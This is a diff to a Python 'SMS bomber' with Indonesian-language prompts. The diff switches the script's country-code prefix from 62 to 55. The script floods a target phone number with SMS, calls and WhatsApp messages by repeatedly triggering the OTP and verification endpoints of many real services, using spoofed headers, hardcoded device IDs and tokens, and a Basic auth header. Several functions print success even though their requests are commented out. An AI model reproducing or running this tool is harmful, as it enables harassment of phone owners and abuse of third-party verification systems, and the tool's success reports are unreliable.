@@ -33,8 +33,8 @@ def input():
   if len(nom) < 5:
     print "%s[%s!%s] %sMasukkan nomor target dengan benar!!"%(pu,me,pu,me)
     input()
-  elif nom.startswith(tuple(["62","+62","0"])):
-    print "%s[%s!%s] %sMasukkan nomor tanpa 62, +62, ataupun 0\n%s[%s!%s] %sContoh : 85877162199"%(pu,me,pu,ku,pu,me,pu,ku)
+  elif nom.startswith(tuple(["55","+55","0"])):
+    print "%s[%s!%s] %sMasukkan nomor tanpa 55, +55, ataupun 0\n%s[%s!%s] %sContoh : 85877155199"%(pu,me,pu,ku,pu,me,pu,ku)
     input()
   else:
     global jum
@@ -42,14 +42,14 @@ def input():
     main()
 #-------------------------------SPAM Function-------------------------------------------
 def asakita():
-  data={'username':'62'+nom}
+  data={'username':'55'+nom}
   h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
   if 'MOBILE' in h:
    sukses("1","sms","asakita")
   else:
    gagal("1","sms","asakita")
 def sunchila():
-#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=62")
+#  hih = requests.get("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0"+nom+"&countryCode=55")
  # if json.loads(hih.text)["result"] == 'true':
    sukses("2","sms","sunchila")
   #else:
@@ -61,32 +61,32 @@ def nutriclub():
   else:
    gagal("3","call","nutriclub")
 def asani():
-  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"62"+nom,"email":"akuntesnuyul@gmail.com"}))
+  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=json.dumps({"phone":"55"+nom,"email":"akuntesnuyul@gmail.com"}))
   if json.loads(j.text)["message"] == 'OTP Terkirim ':
    sukses("4","sms","asani")
   else:
    gagal("4","sms","asani")
 def wintershop():
- #dat=json.dumps(["62"+nom,"Winter Shop","",""])
+ #dat=json.dumps(["55"+nom,"Winter Shop","",""])
 # tes = requests.post("https://api.winter-api.com/account/sendmobilecodeasync.json",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data=dat)
 # if json.loads(tes.text)["message"] == None:
  sukses("5","call","wintershop")
  #else:
   #gagal("5","call","wintershop")
 def datesy():
-# to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
+# to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'55','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
  #if json.loads(to.text)["success"] == True:
   sukses("6","sms","datesy")
  #else:
   #gagal("6","sms","datesy")
 def thaifriendly():
- tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'62','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
+ tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'},data={'z':'phonelogingetpin','country':'55','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
  if json.loads(tes.text)["success"] == True:
   sukses("7","sms","thaifriendly")
  else:
   gagal("7","sms","thaifriendly")
 def jumpstart():
- dat=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+62"+nom},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"})
+ dat=json.dumps({"operationName":"CheckPhoneNoAndGenerateOtpIfNotExist","variables":{"phoneNo":"+55"+nom},"query":"query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"})
  tes=requests.post("https://api.jumpstart.id/graphql",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','content-type':'application/json'},data=dat)
  if json.loads(tes.text)["data"] == None:
   gagal("8","sms","jumpstart")
@@ -99,7 +99,7 @@ def kinimart():
  #else:
  # gagal("9","wa","kinimart")
 def klikwa():
- dat=json.dumps({"number":"+62"+nom})
+ dat=json.dumps({"number":"+55"+nom})
  tes = requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36','Authorization':'Basic QjMzOkZSMzM='},data=dat)
  if json.loads(tes.text)["message"] == 'OTP Sent':
   print "     %s[%s%s%s] [%s Sent %s] %sSuccess, spam %s from %s%s %ssended %s>> %sMau yang unlimited? %shttps://github.com/AbilSeno/WaUnlimitedV3"%(pu,ku,"10",pu,hi,pu,pu,"wa",ku,"klikwa",hi,qu,pu,ku)
@@ -125,7 +125,7 @@ def kredinesia():
  else:
   gagal("13","sms","kredinesia")
 def pinjamindo():
- hu = requests.get("https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"%nom)
+ hu = requests.get("https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=55%s&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"%nom)
  if json.loads(hu.text)["msg"] == 'success':
   sukses("14","sms","pinjamindo")
  else:
@@ -150,7 +150,7 @@ def uangpintar():
 'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
 'X-Requested-With':'com.uf7c21.uangpintar.w465ae'
  }
- pis=requests.post("http://www.uangpintar.id:7092/up/sms_login/vcode",headers=hd,data={'phone':nom,'code':'62'})
+ pis=requests.post("http://www.uangpintar.id:7092/up/sms_login/vcode",headers=hd,data={'phone':nom,'code':'55'})
  if json.loads(pis.text)["desc"] == 'Success':
   sukses("15","sms","uangpintar")
  else:
@@ -236,29 +236,29 @@ def kreditpedia():
 'Accept-Language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
 'X-Requested-With':'com.ecreditpal.tropic2'
  }
- hu=requests.post("https://www.kreditpedia.co.id:8089/tropic/sms_login/vcode",headers=hd,data={'phone':nom,'code':'62'})
+ hu=requests.post("https://www.kreditpedia.co.id:8089/tropic/sms_login/vcode",headers=hd,data={'phone':nom,'code':'55'})
  if json.loads(hu.text)["desc"] == 'Success':
   sukses("22","sms","kreditpedia")
  else:
   gagal("22","sms","kreditpedia")
 def bocil():
- dat={'user_id':'','language':'in','phone':'62'+nom,'device_id':'590bc36d99d6dddb','retry':'0'}
+ dat={'user_id':'','language':'in','phone':'55'+nom,'device_id':'590bc36d99d6dddb','retry':'0'}
  uh = requests.post("https://bocil.id/mobile/v1/miscallotp_request.php",headers={'user-agent':'okhttp/3.10.0'},data=dat).text
  if json.loads(uh)["message"] == 'ok':
   sukses("23","call","bocil")
  else:
   gagal("23","call","bocil")
 def duitqu():
- tes = requests.get("https://appapi.duitqu.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603327368446-6560442845592783226&app=duitqu&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=ccvIIClr0Sw&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10102&sign=1B8BE88D093027E0CD9970C48DCA3F86EDE31C08"%nom)
+ tes = requests.get("https://appapi.duitqu.id/api/v1/custom/send_verify_code?mobile=55%s&af_id=1603327368446-6560442845592783226&app=duitqu&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=ccvIIClr0Sw&is_root=0&l=in&m=vivo+1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10102&sign=1B8BE88D093027E0CD9970C48DCA3F86EDE31C08"%nom)
  sukses("24","sms","duiqu")
 def primacash():
-# uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'62'+nom})).text
+# uhu = requests.post("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=json.dumps({'phone':'55'+nom})).text
 # if json.loads(uhu)["success"] == True:
   sukses("25","sms","primacash")
  #else:
   #gagal("26","sms","primacash")
 def temanprima():
-# dat=json.dumps({"phone":"62"+nom,"place":"google","phone_brand":"vivo","phone_model":"vivo 1902","device_id":"590bc36d99d6dddb"})
+# dat=json.dumps({"phone":"55"+nom,"place":"google","phone_brand":"vivo","phone_model":"vivo 1902","device_id":"590bc36d99d6dddb"})
  #hpo = requests.post("https://pro.temanprima.co.id/teman_prima/user/get_validate_code",headers={'user-agent':'okhttp/3.14.4'},data=dat).text
  #if json.loads(hpo)["success"] == True:
   sukses("28","sms","temanprima")
